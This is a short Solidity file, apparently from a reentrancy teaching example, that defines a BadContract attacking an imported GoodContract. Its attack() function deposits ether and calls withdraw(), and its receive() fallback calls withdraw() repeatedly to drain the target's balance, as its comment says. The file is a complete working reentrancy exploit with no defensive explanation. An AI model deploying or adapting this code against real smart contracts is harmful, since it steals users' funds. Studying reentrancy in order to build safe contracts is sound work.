// SPDX-License-Identifier: MIT
import "./GoodContract.sol";

pragma solidity ^0.8.19;

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }
    // Function to call the withdraw func from goodContract and drain the balance. receive the ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addBalance{value:msg.value} ();
        goodContract.withdraw();
    }

}